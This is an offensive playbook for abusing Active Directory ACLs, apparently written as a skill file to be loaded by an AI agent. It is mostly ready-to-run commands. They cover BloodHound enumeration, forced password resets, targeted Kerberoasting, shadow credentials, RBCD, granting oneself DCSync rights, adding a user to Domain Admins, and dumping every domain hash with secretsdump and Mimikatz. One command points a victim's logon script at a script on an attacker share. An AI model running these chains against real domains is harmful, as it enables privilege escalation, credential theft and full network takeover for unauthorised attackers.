For other original section numbers, use the [entry index](../SKILL.md#references).


# SKILL: AD ACL Abuse — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert AD ACL abuse techniques. Covers BloodHound enumeration, dangerous ACEs (GenericAll, WriteDACL, WriteOwner, etc.), DCSync, shadow credentials, targeted kerberoasting, group manipulation, LAPS, and GPO abuse. Base models miss complex ACL chain exploitation and Cypher query patterns.

## 0. RELATED ROUTING

Before going deep, consider loading:

- [active-directory-kerberos-attacks](../../active-directory-kerberos-attacks/SKILL.md) for Kerberos attacks often chained with ACL abuse
- [active-directory-certificate-services](../../active-directory-certificate-services/SKILL.md) for certificate-based attacks after ACL exploitation
- [ntlm-relay-coercion](../../ntlm-relay-coercion/SKILL.md) for relay attacks that can set ACLs (LDAP relay)
- [windows-lateral-movement](../../windows-lateral-movement/SKILL.md) after gaining elevated AD access

### Advanced Reference

Also load [BLOODHOUND_PATHS.md](../BLOODHOUND_PATHS.md) when you need:
- Common BloodHound attack paths with Cypher queries
- Custom Neo4j queries for finding complex chains
- Data collection and ingestion tips

---

## 1. BLOODHOUND ENUMERATION

### Data Collection

```bash
# SharpHound (from Windows, domain-joined)
SharpHound.exe -c all --outputdirectory C:\temp --zipfilename bh.zip

# bloodhound-python (from Linux)
bloodhound-python -d domain.com -u user -p password -c all -dc DC01.domain.com -ns DC_IP

# Specific collection methods
SharpHound.exe -c DCOnly          # Fastest — only DC queries
SharpHound.exe -c Session         # Session data only (run periodically)
SharpHound.exe -c All,GPOLocalGroup  # Include GPO analysis
```

### Key BloodHound Queries (Built-in)

- "Find all Domain Admins"
- "Shortest Paths to Domain Admins from Owned Principals"
- "Find Principals with DCSync Rights"
- "Shortest Paths to Unconstrained Delegation Systems"
- "Find computers where Domain Users are Local Admin"

---

## 2. DANGEROUS ACE TYPES

| ACE | Effect on Users | Effect on Groups | Effect on Computers |
|---|---|---|---|
| **GenericAll** | Change password, set SPN, modify attributes | Add members | RBCD, LAPS read, all attributes |
| **GenericWrite** | Set SPN, modify attributes, shadow creds | Add members | RBCD, shadow credentials |
| **WriteDACL** | Grant yourself any permission | Same | Same |
| **WriteOwner** | Take ownership → then WriteDACL | Same | Same |
| **ForceChangePassword** | Reset password without knowing old | N/A | N/A |
| **AddMember** | N/A | Add self/others to group | N/A |
| **AllExtendedRights** | Force change password, read LAPS | N/A | Read LAPS, BitLocker keys |
| **ReadLAPSPassword** | N/A | N/A | Read local admin password |
| **WriteSPN** | Set SPN → targeted kerberoast | N/A | N/A |

---

## 3. ACE-SPECIFIC EXPLOITATION

### GenericAll on User

```powershell
# Option 1: Force change password
net user targetuser NewP@ss123 /domain

# Option 2: Targeted Kerberoasting
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/svc'}
# → Kerberoast, then clear SPN

# Option 3: Shadow Credentials
Whisker.exe add /target:targetuser /domain:domain.com /dc:DC01

# Option 4: Set logon script
Set-DomainObject -Identity targetuser -Set @{scriptpath='\\attacker\share\evil.ps1'}
```

### GenericAll / GenericWrite on Computer

```bash
# RBCD attack
rbcd.py -delegate-from 'CONTROLLED$' -delegate-to 'TARGET$' -action write DOMAIN/user:pass -dc-ip DC

# Shadow Credentials on computer
pywhisker.py -d domain.com -u user -p pass --target 'TARGET$' --action add --dc-ip DC
```

### WriteDACL

```powershell
# Grant DCSync rights to yourself
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=com" -PrincipalIdentity lowpriv -Rights DCSync

# Impacket
dacledit.py -action write -rights DCSync -principal lowpriv -target-dn "DC=domain,DC=com" DOMAIN/lowpriv:pass -dc-ip DC
```

### WriteOwner

```powershell
# Step 1: Take ownership
Set-DomainObjectOwner -Identity targetuser -OwnerIdentity lowpriv

# Step 2: Grant WriteDACL to yourself (as owner)
Add-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity lowpriv -Rights All

# Step 3: Now exploit as GenericAll
```

### ForceChangePassword

```bash
# Impacket
rpcclient -U 'DOMAIN/attacker%pass' DC01 -c "setuserinfo2 targetuser 23 'NewP@ss123!'"

# PowerView
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewP@ss123!' -AsPlainText -Force)

# net rpc
net rpc password targetuser 'NewP@ss123!' -U DOMAIN/attacker%pass -S DC01
```

### AddMember to Group

```powershell
# Add self to privileged group
Add-DomainGroupMember -Identity "Domain Admins" -Members lowpriv

# Impacket
net rpc group addmem "Domain Admins" lowpriv -U DOMAIN/attacker%pass -S DC01
```

---

## 4. DCSYNC ATTACK

### Prerequisites
The principal needs **both** of these replication rights on the domain object:
- `DS-Replication-Get-Changes` (GUID: `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`)
- `DS-Replication-Get-Changes-All` (GUID: `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`)

### Execution

```bash
# Impacket — dump all hashes
secretsdump.py DOMAIN/user:password@DC01 -just-dc

# Specific account only
secretsdump.py DOMAIN/user:password@DC01 -just-dc-user krbtgt

# Mimikatz
lsadump::dcsync /domain:domain.com /user:krbtgt
lsadump::dcsync /domain:domain.com /all /csv

# Impacket with Kerberos auth
export KRB5CCNAME=admin.ccache
secretsdump.py -k -no-pass DC01.domain.com -just-dc
```

### Who Has DCSync by Default?

- Domain Admins
- Enterprise Admins
- Domain Controllers group
- `BUILTIN\Administrators` (on domain object)

---

